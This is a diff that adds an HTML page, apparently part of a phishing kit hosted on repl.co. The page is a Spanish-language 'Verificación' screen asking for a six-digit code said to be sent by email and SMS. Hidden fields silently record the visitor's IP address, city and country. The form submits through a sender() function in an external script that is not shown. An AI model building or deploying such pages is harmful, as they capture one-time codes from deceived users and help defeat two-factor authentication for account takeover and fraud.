@@ -1,0 +1,101 @@
+<!-- saved from url=(0075)https://cumbersomedetailedsolidstatedrive.victorortiz15.repl.co/index3.html -->
+<html>
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <script></script>
+      <link rel="stylesheet" href="css/bootstrap.min.css">
+      <title>Home</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="stylesheet" type="text/css" href="css/util.css">
+      <link rel="stylesheet" type="text/css" href="css/main.css">
+       <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+      $("#ip").html("IP: " + response.ip);
+      $("#address").html("" + response.city + ", " + response.country);
+
+      })
+      </script>
+   </head>
+   <body>
+      <header id="main-header">
+         <a class="logo-header" href="#">
+         <img src="img/yDvl2u8.png" style="width: 250px">
+         </a> <!-- / #logo-header -->
+         <div class="menu-header" href="index.html">
+            <div id="bar-menu" class="bar-menu">
+               <span></span>
+               <span></span>
+               <span></span>
+            </div>
+         </div>
+      </header>
+      <!-- / #main-header -->
+      <div class="limiter">
+         <div class="container-login100" style="background-color: white; 
+            position: absolute;
+            ">
+            <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+              
+               <section class="">
+                   <form class="login100-form validate-form" action="" method="post"  onsubmit=" return sender()">
+                     <p id="address" hidden=""></p>
+                     <p id="gfg" hidden="">
+                        <b></b>
+                     </p>  
+                     <div class="textypn1"><b><span class="model" style="font-size:28px; color:#003995; text-align:center;">
+                        Verificación</span></b>
+                     </div>
+                     <div class="wrap-input101 validate-input" data-validate="">
+                        <br>
+                        <div class="textypn2"><span class="model" style="font-size:16px; color:#003995; text-align:center;">
+                           Te enviamos un código al correo electrónico registrado y a tu numero celular</span>
+                        </div>
+                        <br>
+                        <center><img src="img/nXicrhA.png"></center>
+                        <div class="wrap-input101 validate-input" data-validate="">
+                           <span class="label-input101"></span>
+                           <br>
+                           <br>
+                           <div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
+                              Ingresa el código</span>
+                           </div>
+                           <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" style="text-align: left;padding-left: 10px"   id="0T4RX" maxlength="6" minlength="6" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="Debe tener 6 digitos">
+                           <span class="focus-input100" data-symbol=""></span>
+                        </div>
+                        <br>
+                        <div class="text-right p-t-8 p-b-31">
+                        </div>
+                        <div class="container-login100-form-btn">
+                           <div class="wrap-login100-form-btn">
+                              <div class="login100-form-bgbtn"></div>
+                              <button type="submit" style="height:50px; width:100%;font-family: helvetica;font-size: 13pt;" class="login100-form-btn" value="Continuar" id="btnSend">
+                              Continuar
+                              </button>
+                           </div>
+                        </div>
+                        <div>
+                           <br>
+                           <br>
+                        </div>
+                        <br>
+                     </div>
+                  </form>
+               </section>
+            </div>
+           
+            <!-- / #main-header -->
+         </div>
+         <div id="dropDownSelect1"></div>
+         <script src="js/sax4.js"></script>
+      </div>
+   </body>
+</html>
